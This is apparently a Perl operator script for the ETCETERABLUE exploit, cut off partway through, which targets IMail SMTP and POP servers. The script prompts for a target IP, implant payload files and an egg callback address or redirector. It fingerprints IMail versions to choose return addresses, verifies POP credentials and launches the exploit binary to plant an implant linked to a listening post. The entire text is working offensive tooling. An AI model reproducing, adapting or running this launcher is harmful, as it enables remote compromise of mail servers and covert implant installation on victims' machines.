


use strict;
use vars qw($VERSION);

$::VERSION = "ETCETERABLUE Script: 1.1.1";
print "\n\n$::VERSION\n\n";



use FindBin;				
use lib "$FindBin::Bin";	
use Getopt::Long;			
use Cwd;					

use lib "$FindBin::Bin\\..\\..\\Resources\\Perl";
use ExploitUtils qw(
	$EU_LOGFILE
	$EU_VERBOSE
	$EU_BATCHMODE
	EU_LogInit
	EU_Log
	EU_ExitMessage
	EU_GetInput
	EU_GetExistingDir
	EU_GetIP
	EU_GetLocalIP
	EU_GetRootDir
	EU_GetPort
	EU_RunCommand
	EU_GetAddr
);


use vars qw($RIDEAREA $PAYLOAD_DLL $PAYLOAD_EXE $EXPLOIT_EXE @DEPFILES);


my	%opts = ();
GetOptions(\%opts, "v", "h", "q|?", "b", "e=s", "f=s", "d=s", "t=s", "l=s", "c=s", "x=s", "n=s") or &print_script_usage(0);

if (scalar(@ARGV) > 0 ) {
  &EU_Log(1, "Extraneous arguments found on command line: @ARGV");
  &EU_Log(1, "Arguments will be ingnored");
  while(@ARGV) {shift;}
}

if (!defined($opts{"e"})) {
	&EU_Log(1, "A -e option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"f"})) {
	&EU_Log(1, "A -f option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"x"})) {
	&EU_Log(1, "A -x option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"l"})) {
	&EU_Log(1, "A -l option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"n"})) {
	&EU_Log(1, "A -n option must be supplied.");
	&print_usage(0);
}

$::RIDEAREA	= "Resources\\Tools\\ridearea2.exe";	
$::RPCTOUCH	= "Resources\\Tools\\rpctouch.exe";		

$::LP_DLL	= "$opts{l}";					
$::PAYLOAD_DLL	= "$opts{f}";				
$::PAYLOAD_EXE	= "$opts{x}";				
$::PAYLOAD_EXE_NAME = "$opts{n}";			
$::EXPLOIT_EXE	= "$opts{e}\\ETBL.exe";					

$::EGG_SOCKET_NEW			= "2";			
$::EGG_SOCKET_REUSE			= "3";			

$::IMPLANT_SOCKET_NONE		= "1";			
$::IMPLANT_SOCKET_NEW		= "2";			
$::IMPLANT_SOCKET_MAINTAIN	= "3";			

$::RUN_EXPLOIT				= "1";			
$::RUN_PROBE_1				= "2";			
$::RUN_PROBE_2				= "3";			


my $work_dir       = $opts{"d"} if (defined $opts{"d"});
my $root_dir       = $opts{"c"} if (defined $opts{"c"});
my $TargetIpIn      = $opts{"t"} if (defined $opts{"t"});


@DEPFILES = ($::RIDEAREA, $::EXPLOIT_EXE);



my	$logfile_prefix		= "ETBL_";			
my	$logfile_suffix		= "_script.log";	
my	$filename_suffix	= "_payload.bin";	

my	$TargetIp			= $TargetIpIn;		
my	$TargetPort			= 0;				
my	$ImplantSocketStatus= $::IMPLANT_SOCKET_NONE;	
my	$TimeOutValue		= 0;				

my	$PayloadFile		= "";				
my	$PayloadType		= "";				
my	$PayloadDropName	= "N/A";			
my	$TargetNetworkProtocol	= "N/A";		

my $TargetVersion		= -1;	
my $RecvAccount			= "\@";
my $ReturnAdd			= "UNSET";
my $Username			= "";
my $Password			= "";

my  $EggCallbackIp			= "127.0.0.1";		
my  $EggCallbackPort		= 0;				



&print_usage(1) if (defined $opts{"h"});	
&print_usage(0) if (defined $opts{"q"});	

$ExploitUtils::EU_VERBOSE   = 1 if (defined $opts{"v"});	
$ExploitUtils::EU_BATCHMODE = 1 if (defined $opts{"b"});	



if ($ENV{"OS"} ne "Windows_NT") {
    &EU_ExitMessage(1,"This script requires Windows NT or Windows 2000");
}


$work_dir = &EU_GetExistingDir("Enter pathname for operation's working directory", $work_dir, 1);
$root_dir = &EU_GetRootDir($root_dir,@::DEPFILES);



&EU_LogInit($logfile_prefix, $logfile_suffix, $work_dir);
&EU_Log(0,"$::VERSION");



&EU_Log(0,"\nChanging to working directory: $work_dir");
chdir $work_dir || &EU_ExitMessage(1,"Unable to change to working directory: $work_dir");





($TargetIp, $TargetPort, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
 $TargetNetworkProtocol, $EggCallbackIp, $EggCallbackPort, $TargetVersion, $RecvAccount, $ReturnAdd, $Username, $Password) =
	&validate_parms($work_dir, $root_dir, $TargetIp, $TargetPort, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName,
	$TimeOutValue, $TargetNetworkProtocol, $EggCallbackIp, $EggCallbackPort, $RecvAccount, $ReturnAdd);




my $answer;
if(!$EU_BATCHMODE) {
	$answer = &EU_GetInput("\nReady to begin exploit ([y],n,quit)? ", "y");
	&EU_ExitMessage(0,"User terminated script")  if ($answer ne "y" and $answer ne "Y");
}



my $payload_name_format = "${work_dir}\\${logfile_prefix}%04d%02d%02d_%02d%02d%02d${filename_suffix}"; 
my ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) = gmtime(time);

$year += 1900;
$mon  += 1;

my $RA_Payload = sprintf($payload_name_format,$year,$mon,$mday,$hour,$min,$sec);


if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
	if ($PayloadDropName eq "N/A") {
		&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");
	}
	else {
		&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");	
	}
}
elsif( $ImplantSocketStatus eq $::IMPLANT_SOCKET_NEW ) {
	if ($PayloadDropName eq "N/A") {
		&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 13 -a 3 -t m -l m");
	}
	else {
		&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 13 -a 3 -t m -l m");	
	}
}





my $flags;
if($ExploitUtils::EU_VERBOSE) { $flags = "-v"; }
else { $flags = ""; }

&EU_Log(1,"\nExploit will launch in a separate window. Follow the status messages");
&EU_Log(1,"in the new window to determine if it succeeds.");
&EU_Log(1,"\nLaunching exploit...");

my $variableArgs = "";


my $ImplantPayload = $RA_Payload;

if ($ReturnAdd eq "UNSET") {	
	$variableArgs .= "";
} else {
	$variableArgs .= " -R $ReturnAdd";
}

if(($TargetNetworkProtocol eq "pop")
){
	$variableArgs .= " -n \"$Username\" -a \"$Password\"";
} else {
	$variableArgs .= "";
}

&EU_RunCommand("start \"ETBL Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" -r $::RUN_EXPLOIT	-i $TargetIp -p $TargetPort -c $ImplantSocketStatus -I $EggCallbackIp -P $EggCallbackPort	-f \"$ImplantPayload\" -l \"$root_dir\\$::LP_DLL\" -o $TimeOutValue -t $TargetNetworkProtocol -V $TargetVersion -M $RecvAccount $variableArgs\"");


my $cur_dir = cwd();
chdir $cur_dir || &EU_ExitMessage(1,"Unable to switch back to initial directory: $cur_dir");

&EU_ExitMessage(0,"\nDone with $::0.");



sub print_usage() {
	my ($verbose) = @_;
	print "$::VERSION\n";

	print qq~
Usage: $::0 [-v] [-h] [-?] [-b]
             [-d <working directory>] [-e <exploits directory>]
			 [-t <target IP>] [-l <lp dll>]
             [-f <payload dll>] 
			 [-x <payload exe> [-n <Payload Dropname>]]
	 
~;

	if ($verbose) {
		print qq~

  -v                    verbose mode. Default non-verbose mode.

  -h                    Print this help information.

  -?                    Print abbreviated help information.

  -b                    Batch (non-interactive) mode. Default interactive mode.

  -d <working directory> Working Directory
                        Top-level directory where operation's files will be
                        generated. Default E:\.

  -e <exploits directory> Exploits Directory
                        Top-level directory containing exploit files.
						Default one directory up from directory containing this script.

  -t <target IP>        Target IP address.
                        Default derived as last part of working directory name.
  
  -l <lp dll>           Filename of the listening post dll.

  -f <payload dll>      Filename of the implant payload (dll).

  -x <payload exe>      Filename of the implant payload (exe).

  -n <payload dropname> Filename to be used for the dropped executable 

~;
	}

	&EU_ExitMessage(1,"End of help.");
}


sub validate_parms() {
	my ($work_dir, $root_dir, $TargetIp, $TargetPort, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName,
	   $TimeOutValue,$TargetNetworkProtocol, $EggCallbackIp, $EggCallbackPort, $RecvAccount, $RetAdd) = @_;

	my ($continue, $retcode, $vol, $dir);
	my ($redirectFlag);
	my $OrgTargetIp			= $TargetIp;
	my $RedirectionIp		= "127.0.0.1";
	my $Username			= "";
	my $Password			= "";

	my ($LocalIp);

	my $NetworkProtocolOption0	= "SMTP (usually port 25) [DEFAULT]";
	my $NetworkProtocolOption1	= "POP (usually port 110)";
	my $NetworkProtocolSelected    = 0;








    my $not				= "NOT GOOD";
	my $TargetVersion = $not;


	my @imailVersions = (
		"7.04",
		"7.05 EVAL",
		"7.05",
		"7.06",
		"7.07",
		"7.10 EVAL",
		"7.10",
		"7.11",
		"7.12",
		"7.13",
		"7.14",
		"7.15",
		"8.00 EVAL",
		"8.00",
		"8.01",
		"8.02",
		"8.03",
		"8.04",
		"8.05 EVAL",
		"8.05"
	);

	my @imailAddress = (1,1,1,1,
						1,1,0,0,
						0,0,1,1,
						1,1,1,1,
						1,1,1,1);


	$LocalIp = &EU_GetLocalIP("Enter the local IP Address", $LocalIp);
	&EU_Log(0, "Enter the local IP Address:  $LocalIp");
	while (1) {



		&EU_Log(1,"\nSelect Payload file to send:\n");
		&EU_Log(1,"   0) $::PAYLOAD_DLL");		
		&EU_Log(1,"   1) $::PAYLOAD_EXE ($::PAYLOAD_EXE_NAME)");		
		while(1) {
			$retcode = &EU_GetInput("\nEnter selection [0]: ", "0");
			&EU_Log(0, "\nEnter selection [0]: $retcode");

			if($retcode eq "0") {
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_DLL\n");
				$PayloadFile = $::PAYLOAD_DLL;
				$PayloadType = "d";
				$PayloadDropName = "N/A";
			}
			elsif($retcode eq "1") { 
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_EXE\n");
				$PayloadFile = $::PAYLOAD_EXE;
				$PayloadType = "e";
				$PayloadDropName = $::PAYLOAD_EXE_NAME;
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		} 


		&EU_Log(1,"\nSelect the Target Network Protocol To Use:\n");
		&EU_Log(1,"   0) $NetworkProtocolOption0");
		&EU_Log(1,"   1) $NetworkProtocolOption1");
		while(1) {
			$NetworkProtocolSelected = &EU_GetInput("\nEnter selection [0]: ", "0");
			&EU_Log(0, "\nEnter selection [0]: $retcode");
			if (($NetworkProtocolSelected lt "0") or
($NetworkProtocolSelected gt "2")){
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			if ($NetworkProtocolSelected eq "0") { $TargetNetworkProtocol  = "smtp"; $TargetPort = 25; }
			elsif($NetworkProtocolSelected eq "1") {$TargetNetworkProtocol = "pop"; $TargetPort = 110; }

			last;
		}  

		$retcode = &EU_GetInput("\nWill this operation be REDIRECTED ([y],n)? ", "y");
		&EU_Log(0, "\nWill this operation be REDIRECTED ([y],n)? $retcode");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) { $redirectFlag = 1; }
		else { $redirectFlag = 0; }



		if( $redirectFlag == 0 ) {


			$TargetIp = $OrgTargetIp;  
			$TargetIp = &EU_GetIP("\nEnter the target IP Address", $TargetIp);
			&EU_Log(0, "Enter the target IP Address:  $TargetIp");

			$TargetPort = &EU_GetPort("\nEnter the target Port", $TargetPort);
			&EU_Log(0, "Enter the target Port:  $TargetPort");


			&EU_Log(1, "\nThe ETBL Exploit Payload must callback in order to upload the Implant Payload.");

			&EU_Log(1, "The local IP Address should be used as the Egg callback IP Address.");

			$EggCallbackIp = &EU_GetLocalIP("\nEnter the Egg callback IP Address", $LocalIp);
			&EU_Log(0, "Enter the Egg callback IP Address:  $EggCallbackIp");

			if ($TargetNetworkProtocol eq "smtp") { $EggCallbackPort = 25; }
			elsif ($TargetNetworkProtocol eq "pop") { $EggCallbackPort = 110; }

			$EggCallbackPort = &EU_GetPort("\nEnter the Egg callback Port", $EggCallbackPort);
		}

		else {


			$RedirectionIp = &EU_GetIP("\nEnter the Redirection IP address", $RedirectionIp);
			&EU_Log(0, "Enter the target IP Address:  $RedirectionIp");
			$TargetIp = $RedirectionIp;

			$TargetPort = &EU_GetPort("Enter the redirection Port");
			&EU_Log(0,"Enter the redirection Port: $TargetPort");

			&EU_Log(1, "\nThe ETBL Exploit Payload must callback in order to");
			&EU_Log(1, "upload the Implant Payload.  The callback IP Address MUST be that of");
			&EU_Log(1, "the Redirector.  The callback Port MUST be the same number on both");
			&EU_Log(1, "the Redirector and the local machine, else redirection will fail.");
			&EU_Log(1, "The local machine uses this port to listen for the callback, and the");
			&EU_Log(1, "ETBL Exploit Payload uses it to call back to the Redirector.");

			&EU_Log(1, "\nThe redirection IP Address should be used as the Egg callback IP Address.");
			$EggCallbackIp = &EU_GetIP("Enter the Egg callback IP Address");
			&EU_Log(0, "Enter the Egg callback IP Address:  $EggCallbackIp");

			if ($TargetNetworkProtocol eq "smtp") { $EggCallbackPort = 25; }
			elsif ($TargetNetworkProtocol eq "pop") { $EggCallbackPort = 110; }

			$EggCallbackPort = &EU_GetPort("\nEnter the Egg callback Port", $EggCallbackPort);
		}

		if ($redirectFlag == 1)
		{
			$TargetIp = $RedirectionIp;
		}

		if($PayloadType eq "d") {
			$retcode = &EU_GetInput("\nUse the exploit socket connection for the entire operation ([y],n)? ", "y");
			if( $retcode eq "y" or $retcode eq "Y" ) {
				$ImplantSocketStatus = $::IMPLANT_SOCKET_MAINTAIN;
				&EU_Log(1,"The socket connection will be used for the duration of the operation,\nincluding the PEDDLECHEAP connection with the Listening Post.\n");
			}
			else {
				$ImplantSocketStatus = $::IMPLANT_SOCKET_NEW;
				&EU_Log(1,"The exploit socket connection will be used only to deliver PEDDLECHEAP.\nYou must launch the Listening Post separately.");
			}
		}
		else { 
			$ImplantSocketStatus = $::IMPLANT_SOCKET_NEW;
		}


		my $default_timeout = 60;

		if ($TargetNetworkProtocol eq "pop") {
			$default_timeout = 7200;
			&EU_Log(1, "\nUploading the exploit via POP will not result in immediate execution.");
			&EU_Log(1, "The target's mail processor will read queued files over a fixed interval.");
			&EU_Log(1, "By default, IMail will process files every 30 minutes (1800 seconds), but it is configurable up to a maximum of 2 hours (7200 seconds).");
		}
		else {
			&EU_Log(1, "\nThe default time-out value for the target connection is 60 sec.");
			&EU_Log(1, "(You may want to increase this value if the network is exceptionally slow.)");
		}
		
		$retcode = &EU_GetInput("Use default value of $default_timeout sec ([y],n)? ", "y");
		&EU_Log(0, "Use default value of $default_timeout sec ([y],n)?  $retcode");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") or ($retcode eq "$default_timeout") ) {
			$TimeOutValue = "$default_timeout";
		}
		else {
			if ($TargetNetworkProtocol eq "pop") {
				$TimeOutValue = &EU_GetInput("Enter new time-out value (greater than 900): ");
				&EU_Log(0, "Enter new time-out value (greater than 900):  $TimeOutValue");
			}
			else {
				$TimeOutValue = &EU_GetInput("Enter new time-out value (greater than 60): ");
				&EU_Log(0, "Enter new time-out value (greater than 60):  $TimeOutValue");
			}
		}

		if(($TargetNetworkProtocol eq "pop")
){
			$Username = &EU_GetInput("\nEnter a valid username on the target server: ", "");
			$Password = &EU_GetInput("Enter the password for the account: ", "");
		}
		else {
			$Username = "N/A";
			$Password = "N/A";
		}


		&EU_Log(1,"\nConfirm Network Parameters:");
		&EU_Log(1,"\tRoot Directory      : $root_dir");
		&EU_Log(1,"\tLocal IP            : $LocalIp");
		&EU_Log(1,"\tPayload file        : $PayloadFile");
		&EU_Log(1,"\tPayload drop name   : $PayloadDropName");
		if( $redirectFlag ) {
			&EU_Log(1,"\tUsing Redirection   : True");
			&EU_Log(1,"\tRedirector IP       : $TargetIp");
			&EU_Log(1,"\tRedirector Port     : $TargetPort");
		}
		else {
			&EU_Log(1,"\tUsing Redirection   : False");
			&EU_Log(1,"\tTarget IP           : $TargetIp");
			&EU_Log(1,"\tTarget Port         : $TargetPort");
		}
		&EU_Log(1,"\tEgg Callback IP     : $EggCallbackIp");
		&EU_Log(1,"\tEgg Callback Port   : $EggCallbackPort");
		&EU_Log(1,"\tProtocol            : $TargetNetworkProtocol");
		&EU_Log(1,"\tNetwork Time Out    : $TimeOutValue sec");
		&EU_Log(1,"\tUsername            : $Username");
		&EU_Log(1,"\tPassword            : $Password");

		$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

		if( ($continue eq "y") or ($continue eq "yes") or ($continue eq "Y") or ($continue eq "YES") ) {
		} 
		elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		else {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}



		my $probeFlag = "n";			

		$probeFlag = &EU_GetInput("\nUse IMail touch tool to obtain the version ([y],n)? ", "y");

		if(($probeFlag eq "y") or ($probeFlag eq "Y")) {
			my $probeError;
			my $probeType;

			($TargetVersion, $probeError) = &touch_tool($root_dir,$TargetIp,$TargetPort,$TargetNetworkProtocol,$TimeOutValue, @imailVersions);

			&EU_Log(1, "\nDetected target selection is: $TargetVersion");
			
			if( ($probeError == 1) or ($TargetVersion eq $not)) {


				&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
				$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
				&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");

				if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) {
					&EU_ExitMessage(1,"User terminated script\n");
				}
				elsif( ($continue eq "n") or ($continue eq "N") ) {
					&EU_Log(1, "Returning to top of script...\n");
					next;
				}
				else { 
					$probeFlag = "N";
				}
			}

			elsif (!@imailAddress[$TargetVersion]) {

				&EU_Log(1,"The detected Imail version is not explicitly tested, ");
				&EU_Log(1,"and Imail-specific return addresses are not available.");
				&EU_Log(1,"In order to run the exploit, it is necessary to either ");
				&EU_Log(1,"select a different IMail version, or manually enter ");
				&EU_Log(1,"the return address to be used. ");

				$continue = &EU_GetInput("\nDo you wish to select a different IMail version? (y,[n],quit)? ", "no");
				&EU_Log(0, "\nDo you wish to select a different IMail version? (y,[n],quit)? $continue");

				if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) {
					&EU_ExitMessage(1,"User terminated script\n");
				}
				elsif( ($continue eq "y") or ($continue eq "Y") ) {
					$probeFlag = "N";
				}
				else { 
				}

			}

			elsif (@imailVersions[$TargetVersion] eq "8.05"){
				&EU_Log(1,"\nThe IMail version detected (8.05) contains different ");
				&EU_Log(1,"return addresses depending upon whether hotfixes have ");
				&EU_Log(1,"been installed. Unfortunately, the differences are not ");
				&EU_Log(1,"remotely detectable. The return addresses used by your ");
				&EU_Log(1,"current selection assume that hot fixes have been applied.");
				&EU_Log(1,"The non-hotfixed version of 8.05 uses the same ");
				&EU_Log(1,"return addresses as 8.05 EVAL. If the initial exploit attempt");
				&EU_Log(1,"using 8.05 fails, manually select 8.05 EVAL as the IMail version.");
				$continue = &EU_GetInput("\nDo you wish to select a different IMail version? (y,[n],quit)? ", "no");
				&EU_Log(0, "\nDo you wish to select a different IMail version? (y,[n],quit)? $continue");

				if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) {
					&EU_ExitMessage(1,"User terminated script\n");
				}
				elsif( ($continue eq "y") or ($continue eq "Y") ) {
					$probeFlag = "N";
				}
				else { 
				}

			}


		}
		unless (($probeFlag eq "y") or ($probeFlag eq "Y")) {

			while(1) {
				my $IMailVersion = $not;		
				my $verificationStatus = "";

		      	&EU_Log(1,"\n*********************************************************************");
		      	&EU_Log(1,"Set IMail Version");
		      	&EU_Log(1,"CAUTION: - An improper selection may crash the target");
				&EU_Log(1,"*********************************************************************");
				
				for (my $loop_index = 0; $loop_index < scalar(@imailVersions) ; $loop_index++) {
					if ($imailAddress[$loop_index]) {
						$verificationStatus = "verified";
					} else {
						$verificationStatus = "not-verified";
					}						
					&EU_Log(1,"   $loop_index) $imailVersions[$loop_index]\t\t$verificationStatus");
				}
		
		      	$IMailVersion = &EU_GetInput("\nUse default selection [0]: ", "y");
				&EU_Log(0, "Use default selection [0]: $continue");


		      	if(  $IMailVersion eq "y" or $IMailVersion eq "Y" or $IMailVersion eq "0" ) {
					$TargetVersion = 0;
				}
				elsif( $IMailVersion >= 0 and $IMailVersion < scalar(@imailVersions)) {
					$TargetVersion = $IMailVersion;
				}
				else {
					&EU_Log(1, "Invalid choice. Try again or enter 'quit'.");
					next;
				}

				if (!@imailAddress[$TargetVersion]) {
					&EU_Log(1,"Imail version chosen is not explicitly tested, ");
					&EU_Log(1,"and Imail-specific return addresses are not available.");
					&EU_Log(1,"In order to run the exploit, it is necessary to either");
					&EU_Log(1,"choose a different Imail version, or specify the ");
					&EU_Log(1,"explicit return address to use.");


					$continue = &EU_GetInput("\nDo you wish to select a different IMail version? (y,[n],quit)? ", "no");
					&EU_Log(0, "\nDo you wish to select a different IMail version? (y,[n],quit)? $continue");

					if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) {
						&EU_ExitMessage(1,"User terminated script\n");
					}
					elsif( ($continue eq "y") or ($continue eq "Y") ) {
						&EU_Log(1, "Chosing a different IMail version.");
						next;
					}
					else { 
					}
				}

				last;
			}
		} 


		if (!@imailAddress[$TargetVersion]) {

			while(1) {

				$RetAdd = $not;

				&EU_Log(1,"\n*********************************************************************");
				&EU_Log(1,"Set Target's Return Address");
				&EU_Log(1,"NOTE: The provided return address will be used only ");
				&EU_Log(1,"if the Imail version has not been verified. If the return address is");
				&EU_Log(1,"incorrect, the affected application may crash. However, because the");
				&EU_Log(1,"target application is a spawned executable file and not a service,");
				&EU_Log(1,"additional attempts may be made.");
				&EU_Log(1,"*********************************************************************");
	
				$RetAdd = &EU_GetInput("\nEnter return address: ");
				&EU_Log(0, "\nEnter return address: $RetAdd");

				if( $RetAdd eq $not ) {
					&EU_Log(1, "Invalid choice. Try again or enter 'quit'.");
					next;
				}

				last;
			}

		}


		if(($TargetNetworkProtocol eq "pop")
){



			my $probeFlag = "n";			
			my $IMailVersion = $not;		

			$probeFlag = &EU_GetInput("\nUse IMail touch tool to verify $Username / $Password account ([y],n)? ", "y");

			if(($probeFlag eq "y") or ($probeFlag eq "Y")) {
				my $probeError;
				my $probeType;

				($probeError) = &password_touch_tool($root_dir,$TargetIp,$TargetPort, $TargetNetworkProtocol, $TimeOutValue, $Username, $Password);

				if($probeError == 1) {


					&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
					&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
					$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
					&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");

					if( ($continue eq "quit") or ($continue eq "QUIT") or ($continue eq "q") or ($continue eq "Q") ) {
						&EU_ExitMessage(1,"User terminated script\n");
					}
					elsif( ($continue eq "n") or ($continue eq "N") ) {
						&EU_Log(1, "Returning to top of script...\n");
						next;
					}
				}
				elsif($probeError == 0) {
				}
				else {
					&EU_Log(1, "\nProbe returned invalid results.  Returning to top of script...\n");
					next;
				}
			}
			else {
				&EU_Log(1, "Using unverified $Username / $Password for login account.");
			}
		} 




		&EU_Log(1,"\n\nSet 'MAIL FROM' Account");
		&EU_Log(1,"An email account must be specified as the sender of the SMTP message.");
		&EU_Log(1,"An \@ sign suffices, but a full email address may be entered instead.");
		$RecvAccount = &EU_GetInput("\nEnter email account [$RecvAccount]: ", "$RecvAccount");
		&EU_Log(0, "\nEnter email account: $RecvAccount");



		&EU_Log(1,"\nConfirm All Parameters:");
		&EU_Log(1,"\tRoot Directory      : $root_dir");
		&EU_Log(1,"\tLocal IP            : $LocalIp");
		&EU_Log(1,"\tPayload file        : $PayloadFile");
		&EU_Log(1,"\tPayload drop name   : $PayloadDropName");
		if( $redirectFlag ) {
			&EU_Log(1,"\tUsing Redirection   : True");
			&EU_Log(1,"\tRedirector IP       : $TargetIp");
			&EU_Log(1,"\tRedirector Port     : $TargetPort");
		}
		else {
			&EU_Log(1,"\tUsing Redirection   : False");
			&EU_Log(1,"\tTarget IP           : $TargetIp");
			&EU_Log(1,"\tTarget Port         : $TargetPort");
		}
		&EU_Log(1,"\tEgg Callback IP     : $EggCallbackIp");
		&EU_Log(1,"\tEgg Callback Port   : $EggCallbackPort");
		&EU_Log(1,"\tProtocol            : $TargetNetworkProtocol");
		&EU_Log(1,"\tNetwork Time Out    : $TimeOutValue sec");
		&EU_Log(1,"\tUsername            : $Username");
		&EU_Log(1,"\tPassword            : $Password");
		&EU_Log(1,"\tImail Version       : @imailVersions[$TargetVersion]");
		&EU_Log(1,"\tRECV FROM Account   : $RecvAccount");
		&EU_Log(1,"\tReturn Address	    : $RetAdd");

		$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

		if( ($continue eq "y") or ($continue eq "yes") or ($continue eq "Y") or ($continue eq "YES") ) {
			last;
		} 
		elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		else {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}

	} 




	return ($TargetIp, $TargetPort, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
	        $TargetNetworkProtocol, $EggCallbackIp, $EggCallbackPort, $TargetVersion, $RecvAccount, $RetAdd, $Username, $Password);


}

sub touch_tool() {

	my ($root_dir,$SocketIp,$ProbePort, $protocol, $TimeOutValue, @imailVersions) = @_;
	my $handle = new FileHandle;

	my $ProbeError  = 1;			

    my $not			= "NOT GOOD";
	my $VersionSelection = $not;

	my $cmdline = "\"$root_dir\\$::EXPLOIT_EXE\" -r 2 -i $SocketIp -p $ProbePort -o $TimeOutValue -t $protocol";
	&EU_Log(1, "$cmdline");

	&EU_Log(1, "Probing target...");
	if(!open($handle, "$cmdline|")) {
		&EU_ExitMessage(1, "Unable to execute $::EXPLOIT_EXE This error");
	}
	
	my $line;

	while(<$handle>)
	{
		chomp($line = $_);
		&EU_Log(1, "$line");

		for (my $loop_index = 0; $loop_index < scalar(@imailVersions) ; $loop_index++) {
			if($ProbeError == 1 && $line =~ /@imailVersions[$loop_index]/) {
				$VersionSelection = $loop_index;
				$ProbeError = 0;
			}
		}

	}

	return ($VersionSelection,$ProbeError); 
}

sub password_touch_tool() {

my ($root_dir,$SocketIp,$ProbePort, $protocol, $TimeOutValue, $user, $password) = @_;
	my $handle = new FileHandle;

	my $ProbeError  = 1;			
      
	my $cmdline = "\"$root_dir\\$::EXPLOIT_EXE\" -r 3 -i $SocketIp -p $ProbePort -o $TimeOutValue -n $user -a $password -t $protocol";
	&EU_Log(1, "$cmdline");

	&EU_Log(1, "Probing target...");
	if(!open($handle, "$cmdline|")) {
		&EU_ExitMessage(1, "Unable to execute $::EXPLOIT_EXE This error");
	}
	
	my $line;

	while(<$handle>)
	{
		chomp($line = $_);
		&EU_Log(1, "$line");

		if($line =~ /Login was successful/) {
			$ProbeError		= 0;
			&EU_Log(1, "Login as $user / $password was successful." );
			return ($ProbeError);
		}
		elsif($line =~ /Login failed/) {
			$ProbeError		= 1;
			&EU_Log(1, "Login as $user / $password failed.  ETCETERARED will fail." );
			return ($ProbeError);
		}
		else {
			&EU_Log(1, "Received unknown result.  Login as $user / $password may fail." );
			&EU_Log(1, "The unknown message was: $line" );
			$ProbeError		= 1;
			return ($ProbeError);
		}
	}

	return ($ProbeError); 
}


sub launch_rpctouch() {
	my ($root_dir, $TargetIp, $TargetPort, $TargetNetworkProtocol, $TargetServerIp, $TimeOutValue, $probeType) = @_;
	my $handle = new FileHandle;

	my $not = "NOT GOOD";
	my $patched = "PATCHED";
	my $unpatched = "UNPATCHED";
	my $w9x = "Windows 9x";
	my $nt4 = "Windows NT 4.0";
	my $w2k = "Windows 2000";
	my $wxp = "Windows XP";
	my $ws2003	= "Windows Server 2003";

	my $ProbeError = 0;			
	my $MachineType = $not;		

	my $cmdline = "\"$root_dir\\$::RPCTOUCH\" -i $TargetIp -p $TargetPort -s $TargetNetworkProtocol -h $TargetServerIp -t $probeType -o $TimeOutValue";
	&EU_Log(0, "$cmdline");

	&EU_Log(0, "Probing target...");
	if(!open($handle, "$cmdline|")) {
		&EU_ExitMessage(1, "Unable to execute $::REGPROBE");
	}

	my $line;
	my $success = 0;

	if( $probeType eq "0" ) {		

		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) {
				$ProbeError = 1;
				$MachineType = $not;
			}
			elsif($line =~ /Looks like UNKNOWN Windows version/) {
				$MachineType = $not;
			}
			elsif($line =~ /Looks like Windows 9x/) {
				$MachineType = $w9x;
			}
			elsif($line =~ /Looks like Windows NT 4.0/) {
				$MachineType = $nt4;
			}
			elsif($line =~ /Looks like Windows 2000/) {
				$MachineType = $w2k;
			}
			elsif($line =~ /Looks like Windows XP/) {
				$MachineType = $wxp;
			}
			elsif($line =~ /Looks like Windows Server 2003/) {
